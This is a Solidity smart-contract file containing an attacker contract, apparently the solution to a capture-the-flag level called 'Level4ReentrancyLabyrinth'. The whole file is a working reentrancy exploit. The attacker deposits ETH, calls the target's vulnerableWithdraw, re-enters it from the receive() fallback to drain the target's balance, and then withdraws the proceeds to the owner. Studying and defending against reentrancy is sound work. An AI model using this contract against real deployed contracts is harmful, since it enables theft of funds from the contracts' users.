// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILevel4ReentrancyLabyrinth {
    function deposit() external payable;
    function vulnerableWithdraw(uint256 amount) external;
    function checkExploit(address solution) external;
    function secureWithdraw(uint256 amount) external;
    function validateSolution() external;
    function balances(address) external view returns (uint256);
    function totalDeposits() external view returns (uint256);
    function exploitSuccessful() external view returns (bool);
}

contract ReentrancyAttacker {
    ILevel4ReentrancyLabyrinth public target;
    address public owner;
    uint256 public initialDeposit;
    bool private attacking = false;
    uint256 private withdrawalAmount;
    
    constructor(address _target) {
        target = ILevel4ReentrancyLabyrinth(_target);
        owner = msg.sender;
    }
    
    // Setup attack by depositing funds
    function setup() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to setup attack");
        initialDeposit = msg.value;
        target.deposit{value: msg.value}();
    }
    
    // Main exploit function
    function exploit() external onlyOwner {
        require(!attacking, "Already attacking");
        uint256 balance = target.balances(address(this));
        require(balance > 0, "No balance to exploit");
        
        attacking = true;
        withdrawalAmount = balance;
        target.vulnerableWithdraw(withdrawalAmount);
        attacking = false;
    }
    
    // Receive function that continues the reentrancy attack
    receive() external payable {
        if (attacking) {
            uint256 remainingBalance = target.balances(address(this));
            if (remainingBalance >= withdrawalAmount) {
                target.vulnerableWithdraw(withdrawalAmount);
            }
        }
    }
    
    // Withdraw funds from this contract
    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Withdrawal failed");
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call");
        _;
    }
}